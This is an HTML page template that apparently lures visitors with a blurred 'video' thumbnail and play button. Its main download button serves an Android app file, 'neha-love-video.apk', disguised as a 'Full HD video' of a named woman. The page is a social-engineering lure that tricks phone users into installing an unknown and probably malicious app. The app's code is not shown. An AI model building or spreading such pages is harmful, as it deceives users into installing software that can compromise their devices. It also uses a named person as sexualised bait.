<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <style>
        .container {
            position: relative;
            width: 90%; /* Capture 90% of the screen width */
            margin: 20px auto; /* Center the container */
        }
        .image {
            width: 95%; /* Full width of the container */
            display: block;
            filter: blur(5px); /* Blur effect */
        }
        .play-button {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: linear-gradient(135deg, #ff6b6b, #f7a9a9); /* Attractive gradient */
            border: none;
            border-radius: 50%;
            width: 60px; /* Size of the button */
            height: 60px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2); /* Shadow for depth */
            transition: transform 0.3s; /* Smooth transition */
        }
        .play-button:hover {
            transform: translate(-50%, -50%) scale(1.1); /* Slightly enlarge on hover */
        }
        .play-button i {
            font-size: 24px; /* Icon size */
            color: white; /* Icon color */
        }
        .btn {
            margin-top: 20px;
            background: linear-gradient(135deg, #4caf50, #81c784); /* Attractive gradient */
            border: none;
            color: white;
            padding: 12px 30px;
            cursor: pointer;
            font-size: 20px;
            width: 100%;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2); /* Shadow for depth */
            transition: background 0.3s; /* Smooth transition */
        }
        .btn:hover {
            background: linear-gradient(135deg, #388e3c, #66bb6a); /* Darker gradient on hover */
        }
    </style>
</head>
<body>
    
    <a href="neha-love-video.apk" download="Neha Full HD video">
        <button class="btn"><i class="fa fa-download"></i> Download Full HD video</button>
    </a>
    <div class="container">
        <img src="your-image-url.jpeg" alt="Play Video" class="image">
        <button class="play-button"><i class="fa fa-play"></i></button>
    </div>
</body>
</html>
